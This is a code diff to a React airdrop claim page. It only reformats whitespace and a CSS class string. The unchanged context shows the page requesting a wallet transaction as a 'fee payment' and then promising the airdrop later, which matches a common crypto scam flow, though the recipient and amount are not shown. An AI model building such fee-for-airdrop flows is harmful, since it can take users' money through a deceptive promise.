@@ -170,7 +170,6 @@ export default function AirdropPage({
         method: "eth_sendTransaction",
         params: [txParams]
       })
-
       setClaimStatus({
         step: "success",
         message: "Fee payment sent! Your airdrop will be available soon.",
@@ -263,8 +262,7 @@ export default function AirdropPage({
                   href="https://x.com/SadlifeTv_/status/1769708489658495122"
                   target="_blank"
                   rel="noopener noreferrer"
-                  className="w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 
-                    rounded-lg font-semibold text-center transition-all duration-300 backdrop-blur-sm border border-blue-300/20"
+                  className="w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 rounded-lg font-semibold text-center transition-all duration-300 backdrop-blur-sm border border-blue-300/20"
                 >
                   Open X Post
                 </a>
